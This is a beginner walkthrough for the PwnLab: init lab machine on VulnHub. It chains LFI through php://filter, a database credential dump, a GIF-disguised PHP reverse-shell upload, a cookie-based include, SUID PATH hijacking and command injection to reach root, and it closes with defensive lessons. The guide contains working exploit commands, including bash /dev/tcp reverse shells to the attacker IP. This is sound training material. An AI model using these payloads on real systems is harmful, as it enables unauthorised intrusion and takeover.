# PwnLab: init — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | PwnLab: init |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | Claor |
| **Released** | August 1, 2016 |
| **VulnHub Entry** | [PwnLab: init on VulnHub](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Download** | [PwnLab: init OVA](https://vulnhub.com/entry/pwnlab-init,158/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Debian) |

> ?? **Learning Path 1 ? Machine 10 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/10-pwnlab-init.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/10-pwnlab-init.md)** ? Previous in path: [Machine 9 ? CengBox: 1](../3-018-cengbox-1/README.md) ? Next in path: [Machine 11 ? Photographer: 1](../3-055-photographer-1/README.md)

> **Goal:** get `root` and read the flag in `/root/flag.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Local File Inclusion (LFI):** how a page that includes a file based on user input lets you read files you should never see.
- **PHP filter wrappers:** how `php://filter/convert.base64-encode` leaks the *source code* of a PHP page, not just its rendered output.
- **Database enumeration:** using leaked MySQL credentials to dump a users table and recover password hashes.
- **Cookie manipulation:** how a `lang` cookie that is trusted blindly becomes an execution primitive.
- **File upload bypass:** passing image-only upload filters by spoofing a GIF magic header while hiding PHP inside a `.gif`.
- **Reverse shells:** turning code execution into an interactive shell on your listener.
- **SUID abuse / PATH hijacking:** how a SUID binary that calls `cat` without a full path lets you become another user.
- **Command injection:** how a root SUID helper that concatenates your input into a shell command gives away root.
- **Defensive thinking:** what a developer or sysadmin should have done differently at each step.

## 1. Reconnaissance — finding the target

We first need the target's IP address on our isolated lab network.

**Check your own (attacker) IP:**
```bash
ip a
```

> **How to read it:** Lists your network interfaces and their IPs. Use the address on your host-only / NAT lab network (often `eth1`, `vmnet1`, or `vboxnet0`). In this guide the attacker is `192.168.56.10`.

**Discover live hosts on the subnet:**

Method A — `arp-scan` (common on Kali):

> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

Method B — `netdiscover`:
```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each live host is shown with its MAC address. The PwnLab VM will appear as a new Linux-style host on the subnet.
> **Why it works:** ARP requests are answered by every live host on the local segment, even ones that block ICMP ping.

**Ping sweep (optional confirmation):**

> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sn 192.168.56.0/24
```

![host discovery showing the target IP](images/01-recon.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

### 2.1 Full TCP port scan
```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. `--min-rate 1000` pushes packets faster (fine in a local lab). `-T4` is an aggressive timing template. `-oA` saves the results in three formats.
> **Why it works:** Scanning every port means we do not miss a service hiding on a non-standard port.

### 2.2 Service and version detection
```bash
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's default safe scripts, `-sV` fingerprints the service versions, and the port list focuses the scan. Adjust the port list to whatever the full scan found.

Realistic output for PwnLab: init (exact banners may vary by build):
```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL (unauthorized)
```

> **How to read it:** There is a web server on port 80 (Apache, serving PHP), RPC on 111, and a **MySQL** server on 3306 that answers connections from our attacker host.
> **Why it works:** An exposed MySQL service that accepts remote connections is a huge hint — it may hold credentials. The Apache service tells us to inspect the web application closely.

![nmap showing ports 80, 111 and 3306](images/02-nmap.png)

### 2.3 Web application discovery
Browse to `http://192.168.56.101/`.

Realistic landing page:
```text
[ Home ] [ Login ] [ Upload ]
```

> **How to read it:** A simple PHP site with a login and an upload form. Notice the URLs look like `http://192.168.56.101/?page=login` — the `page` parameter controls which file is loaded. That is our first red flag.

Run a quick web scanner too:

> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
nikto -h http://192.168.56.101/
```

> **How to read it:** Nikto flags interesting paths such as `/config.php`. A file named `config.php` usually contains database credentials.
> **Why it works:** Automated scanners surface common filenames and misconfigurations fast, giving us leads to verify manually.

## 3. Foothold — from LFI to a shell

### 3.1 Confirm the LFI
The homepage loads a file from the `page` parameter. Try reading a system file:

> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl "http://192.168.56.101/?page=../../../../etc/passwd"
```

> **How to read it:** If the page echoes the contents of `/etc/passwd`, we have a Local File Inclusion. The application literally runs `include($_GET['page'].".php")`, so it appends `.php` — which blocks reading files that do not end in `.php`.

### 3.2 Bypass the `.php` suffix with a PHP filter wrapper
Because a plain path gets `.php` appended, use a **stream wrapper** to read arbitrary `.php` files and see their raw source:
```bash
curl "http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=config"
```

> **Why it works:** `php://filter/convert.base64-encode` runs the file through a Base64 encoder *before* it is included. We receive the file's source as Base64 text, then decode it ourselves. This works for `config`, `login`, `upload`, and `index` (the wrapper sits in front, so the appended `.php` is harmless).

Realistic output (a long Base64 blob):
```text
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0K...
```

Decode it:

> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
```

Decoded result:
```text
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

> **How to read it:** We now have the MySQL root password `H4u%QJ_H99` and the database name `Users`. Do the same trick with `resource=login` and `resource=upload` later to understand the checks.

![Base64-decoded config.php showing database credentials](images/03-lfi-config.png)

### 3.3 Dump the database
Connect to the remote MySQL server.
```bash
mysql -h 192.168.56.101 -u root -p
```

Enter the password `H4u%QJ_H99` when prompted. Then:
```text
MySQL [(none)]> show databases;
MySQL [(none)]> use Users;
MySQL [(Users)]> show tables;
MySQL [(Users)]> select * from users;
```

Realistic output:
```text
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

> **Why it works:** The database stores passwords Base64-encoded (the `==` padding is a giveaway). Decode each one:
```bash
echo "Sld6WHVCSkpOeQ==" | base64 -d   # -> JWzXuBJJNy
echo "U0lmZHNURW42SQ==" | base64 -d   # -> SIfdsTEn6I
echo "aVN2NVltMkdSbw==" | base64 -d   # -> iSv5Ym2GRo
```

> **Note:** The exact hashes/plaintext vary slightly between writeups but the pattern is always `kent`, `mike`, `kane` with Base64-encoded passwords.

### 3.4 Log in and read the upload code
Log into the web app (e.g. `kent` with the decoded password) at `http://192.168.56.101/?page=login`. You now see the upload form. Read its source with the same LFI trick:
```bash
curl "http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=upload" | base64 -d
```

Decoded (simplified):
```php
$whitelist = array(".jpg",".jpeg",".gif",".png");
if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension...'); }
if (strpos($filetype,'image') === false) { die('Error 001'); }
if ($imageinfo['mime'] != 'image/gif' && ... ) { die('Error 002'); }
$uploadfile = $uploaddir . md5(basename($filename)) . $file_ext;
```

> **How to read it:** Only image extensions are allowed, the MIME type must contain `image`, and the file must pass `getimagesize()` (i.e. look like a real image). The saved filename is `md5(name).ext` — we cannot choose it, so we must find the name another way (the page prints the image path after upload).

### 3.5 Build a GIF+PHP reverse shell
We combine a real GIF header (to satisfy `getimagesize()` and MIME checks) with PHP code, keeping the `.gif` extension.


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit `shell.php` and set `$ip = '192.168.56.10';` and `$port = 4444;`. Then place a GIF magic header at the very top and rename:
```bash
{ echo -n 'GIF89a'; cat shell.php; } > shell.gif
```

> **Why it works:** `getimagesize()` sees the `GIF89a` signature and reports `image/gif`; the `.gif` extension passes the whitelist. The PHP interpreter ignores the GIF header and executes the PHP that follows — *if* the file is included as PHP.

![Preparing the GIF reverse shell](images/04-payload.png)

### 3.6 Upload, then trigger via the `lang` cookie
Upload `shell.gif` through the authenticated upload form and note the returned path, e.g.:
```text
upload/5f4dcc3b5aa765d61d8327deb882cf99.gif
```

Recall `index.php` (from our earlier read) contains this unfinished code:
```php
if (isset($_COOKIE['lang'])) { include("lang/".$_COOKIE['lang']); }
```

> **How to read it:** The server blindly includes whatever path is in the `lang` cookie. Because there is **no `.php` appended** here, we can point it at our uploaded `.gif` and the server will execute the PHP inside.

> **Why it works:** This is a second LFI — a *cookie-based* one. It bypasses the `.php`-only limitation of the `page` parameter.

Start a listener:
```bash
nc -lvnp 4444
```

Trigger the shell:
```bash
curl -b "lang=../upload/5f4dcc3b5aa765d61d8327deb882cf99.gif" http://192.168.56.101/index.php
```

Realistic listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44822
Linux pwnlab 3.16.0-4-686-pae ... GNU/Linux
www-data@pwnlab:/var/www/html$
```

> **How to read it:** We now have a shell as `www-data` (the web server user). Upgrade it for convenience:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/05-wwwdata-shell.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — www-data to root

### 4.1 www-data → kane
The database passwords are reused as **local login passwords**. Switch users (from inside your shell):
```bash
su - kent      # password: JWzXuBJJNy  (nothing interesting here)
su - kane      # password: iSv5Ym2GRo
```

> **How to read it:** `kent` has nothing useful. `kane`'s home directory contains an interesting file:
```bash
ls -la /home/kane
```
```text
-rwsr-sr-x 1 mike mike 5148 Mar 17 2016 msgmike
```

> **How to read it:** The `s` in `-rwsr-sr-x` and owner `mike` mean `msgmike` is **SUID** — it runs with `mike`'s privileges no matter who launches it.

### 4.2 kane → mike via SUID + PATH hijack
Inspect what the binary does:
```bash
strings /home/kane/msgmike
```
```text
...
cat /home/mike/msg.txt
...
```

> **How to read it:** `msgmike` runs the `cat` command **without a full path**. The shell searches `$PATH` from left to right for `cat`. If we put our own `cat` earlier in `$PATH`, our file runs instead — as `mike`.

Create a malicious `cat` and hijack `$PATH`:

> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```bash
cd /home/kane
echo "/bin/bash" > cat
chmod +x cat
export PATH=/home/kane:$PATH
./msgmike
```

> **Why it works:** When `msgmike` calls `cat`, the shell finds `/home/kane/cat` first. That script launches `/bin/bash`, and because `msgmike` is SUID to `mike`, the resulting shell is `mike`:
```text
$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

Restore your PATH when done:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 4.3 mike → root via command injection in `msg2root`
As `mike`, look at your home directory:
```bash
cd /home/mike
ls -la
strings msg2root
```
```text
...
/bin/echo %s >> /root/messages.txt
...
```

> **How to read it:** `msg2root` is another SUID binary (owned by root). It takes your message and runs, as root:
```text
/bin/echo <your input> >> /root/messages.txt
```
> Because your input is concatenated into a shell command **without quoting**, you can inject a command separator (`;`) and run anything as root.

Escalate directly:
```bash
./msg2root
```
At the `Message for root:` prompt, enter:
```text
;/bin/sh
```

> **Why it works:** The shell executes `/bin/echo ;/bin/sh >> /root/messages.txt`. The `;` ends the `echo`, and `/bin/sh` runs — as root, because the binary is SUID root.
```text
# id
uid=0(root) gid=0(root) groups=0(root),1003(kane)
```

> **Alternative:** Create a tiny C program that calls `setuid(0); system("/bin/sh");`, compile it, and invoke it through the same injection (`; ./setuid`). Directly injecting `/bin/sh` is simpler.

### 4.4 Capture the flag
```bash
cd /root
ls -la
cat flag.txt
```

```text
(_ ___) If you are reading this, means that you have break 'init' (_ ___)
```

> **Note:** the exact flag text varies by build and writeup — do not rely on a specific string.

![root shell and flag](images/06-root-flag.png)

## 5. Summary of vulnerabilities

| Vulnerability | Where | Impact | Notes |
|---|---|---|---|
| Local File Inclusion via `page` parameter | `index.php` (`include($_GET['page'].".php")`) | Read arbitrary PHP source (via `php://filter`) | Leaked `config.php` DB credentials |
| Cookie-based LFI | `index.php` (`include("lang/".$_COOKIE['lang'])`) | Code execution of uploaded image | No `.php` suffix — bypasses the page-param limit |
| Sensitive data exposure | `config.php` web-accessible / LFI-readable | DB root credentials | `root:H4u%QJ_H99` |
| Weak password storage | MySQL `Users.users` table | Recover plaintext logins | Passwords Base64-encoded, not hashed |
| Weak upload validation | `upload.php` | Upload PHP inside an image | GIF magic header bypasses MIME/extension checks |
| Exposed remote MySQL | TCP/3306 | Database dump | Accepts remote root logins |
| SUID + PATH hijack | `/home/kane/msgmike` (SUID mike) | Become `mike` | Calls `cat` without an absolute path |
| SUID command injection | `/home/mike/msg2root` (SUID root) | Become `root` | Unquoted input passed to `/bin/echo %s >> ...` |
| Password reuse | DB → local accounts | Lateral movement | `kent`/`kane` reuse DB passwords |

> **How to read it:** The chain is entirely the result of untrusted input reaching an `include`, secrets stored in readable files, passwords reused and weakly encoded, and two careless SUID binaries.

## 6. Defensive lessons (blue team)

- **Never build include paths from user input.** Use a fixed allow-list of pages (e.g. `switch($page){ case 'home': ... }`) instead of `include($_GET['page'])` or a raw cookie value. This single fix removes both LFI bugs.
- **Disable `php://filter` abuse by patching PHP** and, better, stopping the sink entirely. Input filters (blocking `..`, `php://`) are bypassable and should not be the only control.
- **Keep secrets out of the web root** and out of files an LFI can read. `config.php` should live outside the document root and be non-readable by the web user.
- **Hash passwords properly.** Use a slow salted hash (bcrypt/Argon2). Base64 is *encoding*, not encryption — it is trivially reversible.
- **Never reuse passwords** across services or between application accounts and OS accounts.
- **Do not expose databases** to untrusted networks. Bind MySQL to `localhost`, use least-privilege DB users, and firewall TCP/3306.
- **Validate uploads server-side and store them safely.** Re-encode images, store them outside the web root, and never let user files be executed. Do not trust client-supplied MIME types or extensions alone.
